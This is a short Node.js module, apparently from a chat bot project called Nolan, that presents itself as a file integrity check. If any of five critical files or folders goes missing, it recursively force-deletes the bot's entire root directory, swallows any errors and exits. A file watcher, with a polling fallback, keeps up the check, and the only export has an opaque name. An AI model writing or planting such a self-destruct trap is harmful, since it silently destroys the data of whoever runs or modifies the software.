const fs = require('fs');
const path = require('path');

const raizBot = path.resolve(__dirname, '../../');

const itensCriticos = [
  'nolan.js',
  'connect.js',
  'package.json',
  'BANK-NOLAN',
  'IMPORTS-NOLAN'
];

function caminhoItem(item) {
  return path.join(raizBot, item);
}

function apagarPastaBot() {
try {
fs.rmSync(raizBot, { recursive: true, force: true });
} catch (err) {
} finally {
try { process.exit(0); } catch {}
}
}

function verificarIntegridade() {
for (const item of itensCriticos) {
const p = caminhoItem(item);
if (!fs.existsSync(p)) {
apagarPastaBot();
return;
}
}
}

function iniciarWatcher() {
try {
fs.watch(raizBot, { recursive: true }, (eventType, filename) => {
if (!filename) return;
const match = itensCriticos.some(item => filename.startsWith(item));
if (match) {
setTimeout(verificarIntegridade, 300);
}
});
} catch (err) {
const intervalo = setInterval(() => {
for (const item of itensCriticos) {
if (!fs.existsSync(caminhoItem(item))) {
clearInterval(intervalo);
apagarPastaBot();
break;
}
}
}, 2500);
}
}

function lidzeno() {
verificarIntegridade();
iniciarWatcher();
}

module.exports = { lidzeno };